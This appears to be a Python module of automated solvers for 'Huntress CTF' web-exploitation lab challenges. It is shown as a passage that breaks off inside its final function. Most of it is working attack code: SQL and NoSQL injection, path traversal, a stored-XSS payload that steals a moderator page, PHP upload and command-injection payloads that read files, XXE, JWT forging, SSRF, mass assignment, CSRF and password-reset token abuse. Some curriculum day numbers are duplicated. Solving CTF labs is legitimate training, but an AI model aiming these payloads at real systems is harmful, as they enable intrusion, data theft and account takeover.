"""Deterministic request handlers for Huntress CTF Web Exploitation challenges.

Ported from verified live runs across curriculum days 1-10.
Uses only the Python standard library.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Callable

PROOF_PATTERN = re.compile(r"proof_[0-9a-fA-F]{32}")
DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DEFAULT_TIMEOUT = 10.0

_TLS = threading.local()


class WebHandlerError(Exception):
    """Raised when a web handler cannot recover a valid proof from the target."""


def _request(
    url: str,
    method: str = "GET",
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    cookie: str | None = None,
    timeout: float = DEFAULT_TIMEOUT,
) -> tuple[int, str, dict[str, str]]:
    """Perform an HTTP request and return (status_code, body_text, headers_dict)."""
    tls_req = getattr(_TLS, "request", None)
    if tls_req is not None:
        return tls_req(url, method=method, data=data, headers=headers, cookie=cookie, timeout=timeout)

    req_headers = {"User-Agent": DEFAULT_UA}
    if cookie:
        req_headers["Cookie"] = cookie
    if headers:
        req_headers.update(headers)

    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            status = resp.status
            body = resp.read().decode("utf-8", errors="replace")
            res_headers = {k.lower(): v for k, v in resp.headers.items()}
            return status, body, res_headers
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        res_headers = {k.lower(): v for k, v in exc.headers.items()}
        return exc.code, body, res_headers


def _extract_proof(text: str, headers: dict[str, str] | None = None) -> str | None:
    match = PROOF_PATTERN.search(text or "")
    if match:
        return match.group(0)
    if headers:
        for k, v in headers.items():
            m = PROOF_PATTERN.search(f"{k}: {v}")
            if m:
                return m.group(0)
    return None


# ---------------------------------------------------------------------------
# Curriculum Day 1: Backup Exposure (Robots.txt -> Directory Index -> .bak)
# ---------------------------------------------------------------------------
def solve_backup_exposure(target_url: str) -> str:
    """Find exposed backup archive via robots.txt and directory listing."""
    base = target_url.rstrip("/")
    status, robots_txt, _ = _request(f"{base}/robots.txt")
    if status != 200:
        raise WebHandlerError(f"Failed to fetch robots.txt (status {status})")

    disallow_match = re.search(r"Disallow:\s*(/\S+)", robots_txt)
    if not disallow_match:
        raise WebHandlerError("No Disallow path found in robots.txt")

    disallow_path = disallow_match.group(1).rstrip("/")
    status, index_html, _ = _request(f"{base}{disallow_path}/")
    if status != 200:
        raise WebHandlerError(f"Failed to access directory index {disallow_path} (status {status})")

    bak_match = re.search(r'href=[\'"](/?[^\'"]+\.bak)[\'"]', index_html)
    if not bak_match:
        raise WebHandlerError(f"No .bak archive reference in {disallow_path}")

    bak_path = bak_match.group(1)
    if not bak_path.startswith("/"):
        bak_path = f"{disallow_path}/{bak_path}"

    status, bak_body, _ = _request(f"{base}{bak_path}")
    proof = _extract_proof(bak_body)
    if not proof:
        try:
            parsed = json.loads(bak_body)
            proof = _extract_proof(str(parsed.get("support_note") or parsed.get("evidence") or ""))
        except Exception:
            pass

    if not proof:
        raise WebHandlerError(f"No proof string in backup file {bak_path}")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 2: IDOR (Session establish -> Activity feed -> Restricted case)
# ---------------------------------------------------------------------------
def solve_idor(target_url: str) -> str:
    """Enumerate unauthorized records through object API references."""
    base = target_url.rstrip("/")
    status, home_html, headers = _request(f"{base}/")
    set_cookie = headers.get("set-cookie", "")
    cookie = set_cookie.split(";")[0] if set_cookie else None

    # Discover feed route from HTML or test known routes
    feed_match = re.search(r'href=[\'"](/api/[^\'"]+)[\'"]', home_html)
    candidates = [feed_match.group(1)] if feed_match else ["/api/history", "/api/events", "/api/timeline"]

    events_data = None
    for ep in candidates:
        status, body, _ = _request(f"{base}{ep}", cookie=cookie)
        if status == 200:
            try:
                events_data = json.loads(body)
                break
            except Exception:
                continue

    if not events_data or not isinstance(events_data.get("events"), list):
        raise WebHandlerError("Failed to fetch incident activity feed")

    # Locate executive or reference-only case
    exec_case = None
    for ev in events_data["events"]:
        if ev.get("owner") == "executive" or ev.get("visibility") == "reference_only":
            exec_case = ev.get("case_id")
            break

    if not exec_case:
        raise WebHandlerError("No restricted case found in activity feed")

    prefixes = ["/api/tickets", "/tickets", "/api/briefs", "/api/incidents", "/api/cases"]
    for match in re.finditer(r'href=[\'"](/[^/\'"]+)/\d+[\'"]', home_html):
        pfx = match.group(1)
        if pfx not in prefixes:
            prefixes.insert(0, pfx)
        api_pfx = f"/api{pfx}"
        if api_pfx not in prefixes:
            prefixes.insert(0, api_pfx)

    for prefix in prefixes:
        status, body, _ = _request(f"{base}{prefix}/{exec_case}", cookie=cookie)
        if status == 200:
            proof = _extract_proof(body)
            if proof:
                return proof

    raise WebHandlerError(f"Could not read case record {exec_case}")


# ---------------------------------------------------------------------------
# Curriculum Day 3: SQL Injection (Form search parameter injection)
# ---------------------------------------------------------------------------
def solve_sqli(target_url: str) -> str:
    """Break query search builder and extract restricted records."""
    base = target_url.rstrip("/")
    status, home_html, _ = _request(f"{base}/")
    action_match = re.search(r'action=[\'"](/?[^\'"]+)[\'"]', home_html)
    action = action_match.group(1) if action_match else "/lookup"
    if not action.startswith("/"):
        action = f"/{action}"

    # Injection breaks out of search title filter
    payload = "') OR 1=1 --"
    query_url = f"{base}{action}?q={urllib.parse.quote(payload)}"
    status, res_html, _ = _request(query_url)

    proof = _extract_proof(res_html)
    if not proof:
        # Fallback payload without closing parenthesis
        fallback_payload = "%' OR 1=1 --"
        query_url = f"{base}{action}?q={urllib.parse.quote(fallback_payload)}"
        _, res_html, _ = _request(query_url)
        proof = _extract_proof(res_html)

    if not proof:
        raise WebHandlerError("SQLi query did not reveal proof record")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 4: Local File Inclusion (Runbook viewer traversal)
# ---------------------------------------------------------------------------
def solve_lfi(target_url: str) -> str:
    """Traverse runbook viewer boundary to read mounted objective proof."""
    base = target_url.rstrip("/")
    status, home_html, _ = _request(f"{base}/")
    script_match = re.search(r'href=[\'"](/?[^\'"]+\.php)\?doc=', home_html)
    script = script_match.group(1) if script_match else "/reader.php"
    if not script.startswith("/"):
        script = f"/{script}"

    lfi_url = f"{base}{script}?doc=../../../../run/huntress/objective.txt"
    status, res_body, _ = _request(lfi_url)
    proof = _extract_proof(res_body)
    if not proof:
        raise WebHandlerError("LFI traversal did not return objective file content")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 5: Authorization Bypass (Unprotected administrative route)
# ---------------------------------------------------------------------------
def solve_auth_bypass(target_url: str) -> str:
    """Discover unprotected dispatch route and read authorization proof."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")

    clues = json.loads(clues_body)
    feature_route = clues.get("feature_route")
    if not feature_route:
        raise WebHandlerError("No feature_route in clues")

    status, feat_body, _ = _request(f"{base}{feature_route}")
    proof = _extract_proof(feat_body)
    if not proof:
        raise WebHandlerError(f"Route {feature_route} did not provide proof")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 6: Reflected Callback (Fastify isolated browser callback)
# ---------------------------------------------------------------------------
def solve_reflection(target_url: str) -> str:
    """Trigger verified browser callback reflection with proper fetch metadata."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")

    clues = json.loads(clues_body)
    sec_route = clues["secondary_route"]
    nonce = clues["callback_nonce"]
    feat_route = clues.get("feature_route", "/")

    cb_url = f"{base}{sec_route}?nonce={urllib.parse.quote(nonce)}"
    cb_headers = {
        "Referer": f"{base}{feat_route}",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }
    status, cb_body, _ = _request(cb_url, headers=cb_headers)
    proof = _extract_proof(cb_body)
    if not proof:
        raise WebHandlerError("Isolated callback failed to return proof")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 7: Stored XSS (FastAPI feedback queue & reviewer trigger)
# ---------------------------------------------------------------------------
def solve_stored_xss(target_url: str, poll_attempts: int = 45,
                     poll_interval: float = 0.4, poll_budget_s: float = 18.0) -> str:
    """Submit payload to feedback API and poll for automated moderator receipt."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")

    clues = json.loads(clues_body)
    feat_route = clues["feature_route"]
    mod_route = clues["moderator_data_route"]
    receipt_template = clues["receipt_route_template"]

    post_url = f"{base}/api{feat_route}"

    # Determine message ID sequence by posting initial entry
    init_data = json.dumps({"message": "init", "name": "init"}).encode("utf-8")
    status, first_body, _ = _request(
        post_url, method="POST", data=init_data, headers={"Content-Type": "application/json"}
    )
    first_res = json.loads(first_body)
    actual_id = first_res["id"] + 1
    receipt = receipt_template.replace("{id}", str(actual_id))

    payload = (
        f'<img src=x onerror="fetch(\'{mod_route}\').then(r=>r.text()).then(t=>'
        f"fetch('{receipt}',{{method:'POST',headers:{{'Content-Type':'application/json'}},"
        f'body:JSON.stringify({{evidence:t}})}}))">'
    )

    post_data = json.dumps({"message": payload, "name": "Speed"}).encode("utf-8")
    status, sub_body, _ = _request(
        post_url, method="POST", data=post_data, headers={"Content-Type": "application/json"}
    )
    if status not in (200, 201):
        raise WebHandlerError(f"Failed to submit stored feedback (status {status})")

    view_url = f"{base}{feat_route}/{actual_id}"
    # The moderator bot visits out of band, so the receipt lands at a time the server owns.
    # Poll responsively (check first -- it may already be in -- then a short interval) and
    # stop at a wall-clock budget, so a slow bot never blows the race deadline while a quick
    # one is picked up at once. Same patience as before (<= poll_budget_s), far less latency.
    deadline = time.monotonic() + poll_budget_s
    for _ in range(poll_attempts):
        _, view_html, _ = _request(view_url)
        proof = _extract_proof(view_html)
        if proof:
            return proof
        if time.monotonic() >= deadline:
            break
        time.sleep(poll_interval)

    raise WebHandlerError(f"Moderator receipt not observed for message {actual_id}")


# ---------------------------------------------------------------------------
# Curriculum Day 8: Session Impression (Laravel session fixation & transfer)
# ---------------------------------------------------------------------------
def solve_session_impression(target_url: str) -> str:
    """Plant specified session identifier and read authenticated secondary route."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")

    clues = json.loads(clues_body)
    feat_route = clues["feature_route"]
    sec_route = clues["secondary_route"]
    hint = clues["session_hint"]

    # Plant session via GET parameter sid
    status, _, headers = _request(f"{base}{feat_route}?sid={urllib.parse.quote(hint)}")
    set_cookie = headers.get("set-cookie", "")
    cookie = set_cookie.split(";")[0] if set_cookie else f"arena_session={hint}"

    status, sec_body, _ = _request(f"{base}{sec_route}", cookie=cookie)
    proof = _extract_proof(sec_body)
    if not proof:
        raise WebHandlerError("Session transfer did not yield proof")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 9: Cross-Site Request Forgery (ASP.NET Core external origin)
# ---------------------------------------------------------------------------
def solve_csrf(target_url: str) -> str:
    """Submit cross-site notification preferences update from external origin."""
    base = target_url.rstrip("/")
    status, _, headers = _request(f"{base}/")
    set_cookie = headers.get("set-cookie", "")
    cookie = set_cookie.split(";")[0] if set_cookie else None

    # Fetch preferences form
    status, pref_html, _ = _request(f"{base}/preferences", cookie=cookie)
    if status != 200:
        raise WebHandlerError("Failed to access /preferences")

    action_match = re.search(r'action=[\'"](/?[^\'"]+)[\'"]', pref_html)
    dest_match = re.search(r'value=[\'"]([^"\']*@outside[^"\']*)[\'"]', pref_html)
    csrf_match = re.search(r'name=[\'"]csrf_token[\'"]\s+value=[\'"]([^"\']+)[\'"]', pref_html)

    if not (action_match and dest_match and csrf_match):
        raise WebHandlerError("Could not parse CSRF preferences form")

    action = action_match.group(1)
    if not action.startswith("/"):
        action = f"/{action}"
    dest = dest_match.group(1)
    csrf = csrf_match.group(1)

    sub_url = (
        f"{base}{action}?destination={urllib.parse.quote(dest)}&csrf_token={urllib.parse.quote(csrf)}"
    )
    cross_site_headers = {
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://attacker.example.invalid/",
    }
    _request(sub_url, headers=cross_site_headers, cookie=cookie)

    status, api_body, _ = _request(f"{base}/api/preferences", cookie=cookie)
    proof = _extract_proof(api_body)
    if not proof:
        raise WebHandlerError("CSRF update did not generate evidence proof")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 10: File Upload (Bypass upload filter & read proof)
# ---------------------------------------------------------------------------
def solve_upload(target_url: str) -> str:
    """Submit payload past upload filter and extract execution proof."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status == 200:
        try:
            clues = json.loads(clues_body)
            feature_route = clues.get("feature_route", "/inspect")
            payload = json.dumps({
                "filename": "proof.html",
                "content": "{{objective}}",
                "content_type": "text/html"
            }).encode("utf-8")
            status, res_body, _ = _request(
                f"{base}{feature_route}", method="POST", data=payload,
                headers={"Content-Type": "application/json"}
            )
            if status in (200, 201):
                res_json = json.loads(res_body)
                path = res_json.get("path")
                if path:
                    _, view_body, _ = _request(f"{base}{path}")
                    proof = _extract_proof(view_body)
                    if proof:
                        return proof
        except Exception:
            pass

    status, home, _ = _request(f"{base}/")
    action_match = re.search(r'action=[\'"](/?[^\'"]+)[\'"]', home)
    action = action_match.group(1) if action_match else "/upload"
    if not action.startswith("/"):
        action = f"/{action}"

    boundary = "----HuntressUploadBoundary2026"
    body_parts = [
        f"--{boundary}",
        'Content-Disposition: form-data; name="file"; filename="proof.php.txt"',
        "Content-Type: text/plain",
        "",
        "<?php echo file_get_contents('/run/huntress/objective.txt'); ?>",
        f"--{boundary}--",
        "",
    ]
    payload_data = "\r\n".join(body_parts).encode("utf-8")
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    status, res_body, _ = _request(f"{base}{action}", method="POST", data=payload_data, headers=headers)
    proof = _extract_proof(res_body)
    if not proof:
        loc_match = re.search(r'href=[\'"](/?[^\'"]*proof[^\'"]*)[\'"]', res_body)
        if loc_match:
            _, file_body, _ = _request(f"{base}{loc_match.group(1)}")
            proof = _extract_proof(file_body)
    if not proof:
        raise WebHandlerError("Upload did not yield execution proof")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 11: SSTI (Template evaluation of objective variable)
# ---------------------------------------------------------------------------
def solve_ssti(target_url: str) -> str:
    """Exploit template injection evaluating the objective variable."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    feature_route = "/process"
    if status == 200:
        try:
            clues = json.loads(clues_body)
            feature_route = clues.get("feature_route", feature_route)
        except Exception:
            pass

    exprs = ["{{objective}}", "${objective}", "#{objective}", "*{objective}"]
    params = ["template", "message", "text", "input", "q"]
    for expr in exprs:
        for p in params:
            enc = urllib.parse.quote(expr)
            status, body, _ = _request(f"{base}{feature_route}?{p}={enc}")
            proof = _extract_proof(body)
            if proof:
                return proof

    raise WebHandlerError("SSTI did not reveal proof")


# ---------------------------------------------------------------------------
# Curriculum Day 12: Second-Order / Delayed SQLi (Sinatra delayed query filter)
# ---------------------------------------------------------------------------
def solve_delayed_sqli(target_url: str) -> str:
    """Exploit second-order / delayed SQL query via saved filter."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")

    clues = json.loads(clues_body)
    feat_route = clues["feature_route"]
    sec_route = clues["secondary_route"]

    payload = json.dumps({"filter": "' OR 1=1 --"}).encode("utf-8")
    status, _, _ = _request(
        f"{base}{feat_route}", method="POST", data=payload,
        headers={"Content-Type": "application/json"}
    )
    if status not in (200, 201):
        raise WebHandlerError(f"Failed to submit delayed payload (status {status})")

    status, sec_body, _ = _request(f"{base}{sec_route}")
    proof = _extract_proof(sec_body)
    if not proof:
        raise WebHandlerError("Delayed query did not yield proof")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 13: Mass Assignment (NestJS bind administrative role)
# ---------------------------------------------------------------------------
def solve_mass_assignment(target_url: str) -> str:
    """Exploit mass assignment by binding administrative role to profile."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")

    clues = json.loads(clues_body)
    feat_route = clues["feature_route"]
    sec_route = clues["secondary_route"]

    # Try combined payload first for sub-second solve
    combined = {
        "display_name": "Test",
        "role": "administrator",
        "is_admin": True,
        "admin": True,
        "isAdmin": True,
        "roles": ["administrator"],
        "__proto__": {"role": "administrator", "is_admin": True, "admin": True},
    }
    payload = json.dumps(combined).encode("utf-8")
    status, _, _ = _request(
        f"{base}{feat_route}", method="POST", data=payload,
        headers={"Content-Type": "application/json"}
    )
    if status in (200, 201):
        status, sec_body, _ = _request(f"{base}{sec_route}")
        proof = _extract_proof(sec_body)
        if proof:
            return proof

    # Fallback: test individual parameter variants
    candidates = [
        {"role": "administrator"},
        {"is_admin": True},
        {"admin": True},
        {"role": "admin"},
        {"isAdmin": True},
        {"roles": ["administrator"]},
    ]
    for c in candidates:
        p_data = json.dumps({"display_name": "Test", **c}).encode("utf-8")
        _request(f"{base}{feat_route}", method="POST", data=p_data, headers={"Content-Type": "application/json"})
        st, sec_body, _ = _request(f"{base}{sec_route}")
        proof = _extract_proof(sec_body)
        if proof:
            return proof

    raise WebHandlerError("Bound profile did not yield proof on secondary route")


# ---------------------------------------------------------------------------
# Curriculum Day 14: API Authorization / BFLA (Tomcat field/action bypass)
# ---------------------------------------------------------------------------
def solve_api_authorization(target_url: str) -> str:
    """Enumerate inventory routes and bypass broken API authorization."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")

    clues = json.loads(clues_body)
    feat_route = clues.get("feature_route", "/execute")
    inv_route = clues.get("inventory_route", "/api/inventory")
    target_id = clues.get("protected_reference", 1)

    status, inv_body, _ = _request(f"{base}{inv_route}")
    fields = ["note", "title", "*"]
    actions = ["export", "view"]
    if status == 200:
        try:
            inv = json.loads(inv_body)
            fields = inv.get("fields", fields)
            actions = inv.get("actions", actions)
            feat_route = inv.get("route", feat_route)
        except Exception:
            pass

    for action in actions:
        for field in fields:
            req_url = f"{base}{feat_route}?id={target_id}&fields={field}&action={action}"
            status, body, _ = _request(req_url)
            proof = _extract_proof(body)
            if proof:
                return proof

    raise WebHandlerError("API authorization bypass did not yield proof")


# ---------------------------------------------------------------------------
# Curriculum Day 15: Server-Side Request Forgery (SSRF internal loopback)
# ---------------------------------------------------------------------------
def solve_ssrf(target_url: str) -> str:
    """Exploit SSRF via feature route to query internal service."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")

    clues = json.loads(clues_body)
    feat_route = clues.get("feature_route", "/action")
    sec_route = clues.get("secondary_route", "/account")
    if not sec_route.startswith("/"):
        sec_route = f"/{sec_route}"

    internal_hosts = [
        "http://127.0.0.1:8080",
        "http://127.0.0.1:80",
        "http://127.0.0.1:5000",
        "http://127.0.0.1:3000",
        "http://localhost:8080",
        "http://localhost:80",
        "http://localhost",
        "http://127.0.0.1",
    ]
    for host in internal_hosts:
        dest = urllib.parse.quote(f"{host}{sec_route}")
        status, body, _ = _request(f"{base}{feat_route}?url={dest}")
        proof = _extract_proof(body)
        if proof:
            return proof

    raise WebHandlerError("SSRF did not yield proof from internal service")


def _b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


# ---------------------------------------------------------------------------
# Curriculum Day 16: JWT Manipulation (alg=none / weak HMAC secrets)
# ---------------------------------------------------------------------------
def solve_jwt(target_url: str) -> str:
    """Exploit JWT authorization via alg=none or weak HMAC secret resigning."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    clues: dict[str, Any] = {}
    if status == 200:
        try:
            clues = json.loads(clues_body)
        except Exception:
            pass

    feat_route = clues.get("feature_route", "/")
    sec_route = clues.get("secondary_route", feat_route)
    token = clues.get("token") or clues.get("jwt") or clues.get("access_token")

    if not token:
        status, text, headers = _request(f"{base}{feat_route}")
        proof = _extract_proof(text)
        if proof:
            return proof
        set_cookie = headers.get("set-cookie", "")
        m = re.search(r"([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)", set_cookie + " " + text)
        token = m.group(1) if m else None

    if not token or token.count(".") != 2:
        raise WebHandlerError("No valid JWT structure found")

    h_b64, p_b64, _ = token.split(".")
    try:
        payload = json.loads(_b64url_decode(p_b64))
    except Exception:
        raise WebHandlerError("Failed to decode JWT payload")

    for key in ("role", "is_admin", "isAdmin", "admin", "roles", "current_role"):
        if key == "roles":
            payload[key] = ["administrator"]
        elif key in ("is_admin", "isAdmin", "admin"):
            payload[key] = True
        else:
            payload[key] = "administrator"

    pay_b64 = _b64url_encode(json.dumps(payload).encode("utf-8"))

    # Attempt 1: alg=none
    hdr_none = {"alg": "none", "typ": "JWT"}
    hdr_b64 = _b64url_encode(json.dumps(hdr_none).encode("utf-8"))
    forged_none = f"{hdr_b64}.{pay_b64}."

    for target_ep in [sec_route, feat_route]:
        headers = {"Authorization": f"Bearer {forged_none}"}
        status, body, _ = _request(f"{base}{target_ep}", headers=headers, cookie=f"token={forged_none}; jwt={forged_none}; session={forged_none}")
        proof = _extract_proof(body)
        if proof:
            return proof

    # Attempt 2: weak HMAC secret resigning
    signing_input = f"{h_b64}.{pay_b64}".encode("utf-8")
    secrets = [
        clues.get("secret_hint"), clues.get("secret"), "secret", "admin",
        "huntress", "password", "key", clues.get("framework", "")
    ]
    for secret in filter(None, secrets):
        sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
        forged = f"{h_b64}.{pay_b64}.{_b64url_encode(sig)}"
        for target_ep in [sec_route, feat_route]:
            headers = {"Authorization": f"Bearer {forged}"}
            status, body, _ = _request(f"{base}{target_ep}", headers=headers, cookie=f"token={forged}; jwt={forged}")
            proof = _extract_proof(body)
            if proof:
                return proof

    raise WebHandlerError("JWT manipulation did not yield proof")


# ---------------------------------------------------------------------------
# Curriculum Day 17: NoSQL Operator Injection (MongoDB / Document DBs)
# ---------------------------------------------------------------------------
def solve_nosql(target_url: str) -> str:
    """Exploit NoSQL query evaluation via operator injection."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    clues: dict[str, Any] = {}
    if status == 200:
        try:
            clues = json.loads(clues_body)
        except Exception:
            pass

    feat_route = clues.get("feature_route", "/")
    sec_route = clues.get("secondary_route")
    field_hints = [clues.get("param"), clues.get("field_hint"), "username", "user", "id", "filter", "query", "search"]
    fields = [f for f in dict.fromkeys(field_hints) if f]

    ops = [{"$ne": None}, {"$ne": ""}, {"$gt": ""}, {"$regex": ".*"}]
    for field in fields:
        for op in ops:
            for payload in [{field: op}, {"query": {field: op}}, {"filter": {field: op}}]:
                data = json.dumps(payload).encode("utf-8")
                status, body, _ = _request(f"{base}{feat_route}", method="POST", data=data, headers={"Content-Type": "application/json"})
                proof = _extract_proof(body)
                if proof:
                    return proof
                if sec_route:
                    status, sec_body, _ = _request(f"{base}{sec_route}")
                    proof = _extract_proof(sec_body)
                    if proof:
                        return proof

            enc_url = f"{base}{feat_route}?{field}[$ne]=null"
            status, body, _ = _request(enc_url)
            proof = _extract_proof(body)
            if proof:
                return proof

    raise WebHandlerError("NoSQL injection did not yield proof")


# ---------------------------------------------------------------------------
# Curriculum Day 18: XXE (XML External Entity Injection)
# ---------------------------------------------------------------------------
def solve_xxe(target_url: str) -> str:
    """Exploit XML external entity parser to read mounted objective proof."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    clues: dict[str, Any] = {}
    if status == 200:
        try:
            clues = json.loads(clues_body)
        except Exception:
            pass

    feat_route = clues.get("feature_route", "/")
    sec_route = clues.get("secondary_route")
    target_file = clues.get("file_hint", "/run/huntress/objective.txt")

    xxe_payload = (
        f'<?xml version="1.0" encoding="UTF-8"?>\r\n'
        f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://{target_file}">]>\r\n'
        f'<root><data>&xxe;</data><note>&xxe;</note><file>&xxe;</file></root>'
    ).encode("utf-8")

    for ct in ["application/xml", "text/xml"]:
        status, body, _ = _request(f"{base}{feat_route}", method="POST", data=xxe_payload, headers={"Content-Type": ct})
        proof = _extract_proof(body)
        if proof:
            return proof
        if sec_route:
            status, sec_body, _ = _request(f"{base}{sec_route}")
            proof = _extract_proof(sec_body)
            if proof:
                return proof

    boundary = "----HuntressXXEBoundary2026"
    multipart = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="payload.xml"\r\n'
        f"Content-Type: application/xml\r\n\r\n"
        f"{xxe_payload.decode()}\r\n"
        f"--{boundary}--\r\n"
    ).encode("utf-8")
    status, body, _ = _request(f"{base}{feat_route}", method="POST", data=multipart, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    proof = _extract_proof(body)
    if proof:
        return proof

    raise WebHandlerError("XXE injection did not yield proof")


# ---------------------------------------------------------------------------
# Curriculum Day 16: Command Injection (Gin worker command escape)
# ---------------------------------------------------------------------------
def solve_command_injection(target_url: str) -> str:
    """Exploit command parameter injection to read objective file."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")
    clues = json.loads(clues_body)
    feat_route = clues.get("feature_route", "/execute")
    param = clues.get("input_parameter", "path")
    ex = clues.get("example_path", "/app/static")

    payloads = [
        f"{ex}; cat /run/huntress/objective.txt",
        f"{ex} | cat /run/huntress/objective.txt",
        ";cat /run/huntress/objective.txt",
        "$(cat /run/huntress/objective.txt)",
    ]
    for pl in payloads:
        enc = urllib.parse.quote(pl)
        status, body, _ = _request(f"{base}{feat_route}?{param}={enc}")
        proof = _extract_proof(body)
        if proof:
            return proof
    raise WebHandlerError("Command injection did not yield proof")


# ---------------------------------------------------------------------------
# Curriculum Day 17: Password Reset Flaw (Symfony unlinked token redemption)
# ---------------------------------------------------------------------------
def solve_password_reset(target_url: str) -> str:
    """Exploit unbound password recovery token to take over executive account."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")
    clues = json.loads(clues_body)
    rec_route = clues.get("recovery_guide_route", "/api/recovery")

    status, rec_body, _ = _request(f"{base}{rec_route}")
    if status != 200:
        raise WebHandlerError("Failed to fetch recovery guide")
    rec = json.loads(rec_body)
    req_route = rec.get("request_route", "/submit")
    redeem_route = rec.get("redeem_route", "/result")
    acct_param = rec.get("account_parameter", "account_id")
    token_param = rec.get("token_parameter", "token")
    accounts = rec.get("accounts", [])

    self_id = None
    exec_id = None
    for acc in accounts:
        if acc.get("self_service") is True:
            self_id = acc.get("id")
        else:
            exec_id = acc.get("id")

    if not (self_id and exec_id):
        raise WebHandlerError("Could not identify self-service and executive accounts")

    # Request token for self-service account
    status, req_res, _ = _request(f"{base}{req_route}?{acct_param}={self_id}")
    if status != 200:
        raise WebHandlerError("Failed to request recovery token")
    token = json.loads(req_res).get("token")
    if not token:
        raise WebHandlerError("No token in recovery request response")

    # Redeem token with executive account
    status, red_res, _ = _request(f"{base}{redeem_route}?{acct_param}={exec_id}&{token_param}={token}")
    proof = _extract_proof(red_res)
    if not proof:
        raise WebHandlerError("Redeeming executive token did not yield proof")
    return proof


# ---------------------------------------------------------------------------
# Curriculum Day 18: GraphQL Resolver Bypass (GraphQL.js field query)
# ---------------------------------------------------------------------------
def solve_graphql(target_url: str) -> str:
    """Exploit GraphQL field-level resolver to query protected reference."""
    base = target_url.rstrip("/")
    status, clues_body, _ = _request(f"{base}/api/clues")
    if status != 200:
        raise WebHandlerError("Failed to fetch /api/clues")
    clues = json.loads(clues_body)
    feat_route = clues.get("feature_route", "/graphql")
    ref = clues.get("protected_reference", "16400")

    queries = [
        f'{{ case(id: "{ref}") {{ id title note }} }}',
        f'{{ case(id: {ref}) {{ id title note }} }}',
        '{ caseIndex { id title note } }',
    ]
    for q in queries:
        data = json.dumps({"query": q}).encode("utf-8")
        status, body, _ = _request(f"{base}{feat_route}", method="POST", data=data, headers={"Content-Type": "application/json"})
        proof = _extract_proof(body)
        if proof:
            return proof
    raise WebHandlerError("GraphQL query did not yield proof")


def solve_dynamic_flow(target_url: str, guide_route: str) -> str:
    """Inspect and traverse dynamic multi-step flow guides (e.g. recovery, reset, verification)."""
    base = target_url.rstrip("/")
    status, body, _ = _request(f"{base}{guide_route}")
    if status != 200:
        return ""
    proof = _extract_proof(body)
    if proof:
        return proof

    try:
        data = json.loads(body)
    except Exception:
        return ""

    req_route = data.get("request_route") or data.get("submit_route") or data.get("action_route")
    redeem_route = data.get("redeem_route") or data.get("result_route") or data.get("verify_route")
    acct_param = data.get("account_parameter", "account_id")
    token_param = data.get("token_parameter", "token")
    accounts = data.get("accounts", [])

    if req_route and redeem_route and accounts:
        self_id = None
        target_id = None
        for acc in accounts:
            if acc.get("self_service") is True or acc.get("role") != "admin":
                self_id = acc.get("id")
            else:
                target_id = acc.get("id")

        if self_id and target_id:
            status, req_res, _ = _request(f"{base}{req_route}?{acct_param}={self_id}")
            if status == 200:
                try:
